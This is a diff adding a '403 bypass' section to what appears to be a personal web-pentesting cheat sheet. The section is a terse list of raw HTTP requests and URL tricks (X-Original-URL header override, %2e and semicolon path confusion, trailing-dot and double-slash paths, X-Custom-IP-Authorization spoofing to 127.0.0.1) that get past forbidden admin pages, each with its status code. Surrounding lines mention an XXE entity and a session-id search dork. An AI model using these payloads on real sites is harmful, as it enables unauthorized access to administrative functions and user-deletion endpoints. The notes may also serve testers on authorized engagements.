@@ -106,7 +106,36 @@ can put "http://collaborator_ip" in <!ENTITY xxe SYSTEM "http://collaborator">
  inrul:login;jsessionid=    >> to see squestoinal session id 
  
  
- 
+ -------------------------------------------------------------------------------------------
+                                      403 PYPASS
+                                      GET /admin HTTP/1.1
+Host: web.com                   >>forbidden
+---------------------
+GET /anyfile  HTTP/1.1
+Host: web.com 
+X-Original-URL: /admin      ==>200
+-------------------
+https://web.com/path  ==> forbidden
+https://web.com/%2e/path        ==>200
+------------------
+GET /delete?user=ali    HTTP/1.1    =>unahtorized
+-------------------
+/admin/panel        ==>403 forbidden
+/admin/monitor/     ==>200
+then 
+/admin/monitor/;panel      ==>200
+-----------------
+GET /delete?user=ali    HTTP/1.1
+X-Custom-IP-Authorization: 127.0.0.1    ==>302 done
+------------------
+example.com/admin   ==> 403
+exmaple.com/admin/.      ==>200
+example.com//admin//    ==>200
+exmaple.com/./admin/./  ==>200
+---------------------
+https://example.com/admin   ==>302
+https://exmale.com/admin..;
+
  
  ----------------------------------------------------------------------------------------------
                                 open redirect
